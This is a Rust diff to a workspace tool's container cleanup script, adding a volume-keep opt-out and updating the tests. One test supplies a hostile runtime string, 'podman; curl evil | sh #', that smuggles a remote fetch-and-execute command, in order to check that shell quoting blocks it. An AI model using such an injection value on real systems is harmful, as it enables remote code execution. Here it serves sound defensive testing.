@@ -310,7 +310,7 @@ impl RepoEntry {
     }
 }
 
-/// Compose-lifecycle fallback for a container repo with no declared script; `post-remove` drops both worktree-scoped volumes and the compose project's built images, since both are `ws`-namespaced and orphan otherwise (recreating the branch would silently reuse stale data, or leak image layers indefinitely). `WS_KEEP_IMAGES=1` skips the image prune while still dropping volumes — the escape hatch `ws rm --no-prune-images` sets. `runtime` is `shell_quote`d because these run via `sh -c` from a possibly-cloned `.ws.json`.
+/// Compose-lifecycle fallback for a container repo with no declared script; `post-remove` drops both worktree-scoped volumes and the compose project's built images, since both are `ws`-namespaced and orphan otherwise (recreating the branch would silently reuse stale data, or leak image layers indefinitely). `WS_KEEP_IMAGES=1` / `WS_KEEP_VOLUMES=1` opt out of the image and volume drops respectively — the escape hatches `ws rm --keep-images` and `ws rm --keep-volumes` set. `runtime` is `shell_quote`d because these run via `sh -c` from a possibly-cloned `.ws.json`.
 pub fn default_script(runtime: &str, event: &str) -> Option<String> {
     let args = match event {
         "up" => "compose up -d",
@@ -337,11 +337,10 @@ fn status_script(runtime: &str) -> String {
 /// Enumerate this compose project's built images by reference prefix and `rmi -f` them after `down` — direct because compose's own `--rmi local` scopes via labels that podman-compose (python) doesn't always write. Reference filter naturally excludes pulled bases (`postgres:16`, `redis:7`, …) since compose names built images `<project>-<service>` while pulled ones keep their upstream repo name.
 fn post_remove_script(runtime: &str) -> String {
     format!(
-        r#"if [ -n "$WS_KEEP_IMAGES" ]; then
-    exec {r} compose down -v
-fi
-imgs=$({r} images --filter reference="${{COMPOSE_PROJECT_NAME}}*" -q 2>/dev/null | sort -u)
-{r} compose down -v
+        r#"v="-v"; [ -n "$WS_KEEP_VOLUMES" ] && v=""
+imgs=""
+[ -z "$WS_KEEP_IMAGES" ] && imgs=$({r} images --filter reference="${{COMPOSE_PROJECT_NAME}}*" -q 2>/dev/null | sort -u)
+{r} compose down $v
 status=$?
 [ -n "$imgs" ] && {r} rmi -f $imgs >/dev/null 2>&1
 exit $status
@@ -677,13 +676,20 @@ mod tests {
     #[test]
     fn post_remove_default_prunes_project_images_and_honors_the_keep_env() {
         let s = default_script("podman", "post-remove").expect("post-remove default");
-        assert!(s.contains("podman compose down -v"), "compose down -v must run: {s}");
+        assert!(s.contains("podman compose down $v"), "compose down must gate volumes on $v: {s}");
+        assert!(
+            s.contains(r#"[ -n "$WS_KEEP_VOLUMES" ]"#),
+            "must branch on $WS_KEEP_VOLUMES to toggle the -v flag: {s}"
+        );
         assert!(
             s.contains(r#"podman images --filter reference="${COMPOSE_PROJECT_NAME}*" -q"#),
             "must enumerate images by project-scoped reference (excludes pulled bases): {s}"
         );
         assert!(s.contains("podman rmi -f"), "must prune the enumerated images: {s}");
-        assert!(s.contains(r#"[ -n "$WS_KEEP_IMAGES" ]"#), "must branch on $WS_KEEP_IMAGES: {s}");
+        assert!(
+            s.contains(r#"[ -z "$WS_KEEP_IMAGES" ]"#),
+            "must branch on $WS_KEEP_IMAGES before enumerating images: {s}"
+        );
         assert!(s.contains("exit $status"), "must exit with compose down's status, not rmi's: {s}");
     }
 
@@ -697,7 +703,7 @@ mod tests {
     fn post_remove_default_quotes_a_hostile_runtime_at_every_site() {
         let s = default_script("podman; curl evil | sh #", "post-remove").unwrap();
         assert!(!s.contains("podman; curl evil | sh # compose"), "unquoted runtime leaked: {s}");
-        assert!(s.contains("'podman; curl evil | sh #' compose down -v"), "compose down must be quoted: {s}");
+        assert!(s.contains("'podman; curl evil | sh #' compose down $v"), "compose down must be quoted: {s}");
         assert!(s.contains("'podman; curl evil | sh #' images --filter"), "images query must be quoted: {s}");
         assert!(s.contains("'podman; curl evil | sh #' rmi -f"), "rmi must be quoted: {s}");
     }
